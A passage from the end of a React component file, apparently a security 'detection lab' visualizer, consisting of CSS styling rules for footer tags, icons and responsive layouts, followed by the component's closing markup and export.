          display: flex;
          align-items: center;
          gap: 8px;
          color: var(--text-secondary);
        }

        .footer-shield-icon {
          color: #00fff9;
          flex-shrink: 0;
        }

        .lab-footer-tag {
          font-family: var(--font-heading);
          font-size: 0.68rem;
          color: var(--primary);
          letter-spacing: 1px;
          background: rgba(0, 229, 163, 0.08);
          border: 1px solid var(--glass-border);
          padding: 0.2rem 0.6rem;
          border-radius: 4px;
        }

        @media (max-width: 968px) {
          .stage-inspector-grid {
            grid-template-columns: 1fr;
          }
        }

        @media (max-width: 600px) {
          .detection-lab-card {
            padding: 1.2rem;
          }
          .threat-title {
            font-size: 1.1rem;
          }
          .scenario-pill {
            font-size: 0.72rem;
            padding: 0.45rem 0.75rem;
          }
          .stage-heading {
            font-size: 1.15rem;
          }
        }
      `}</style>
    </section>
  );
};

export default DetectionVisualizer;
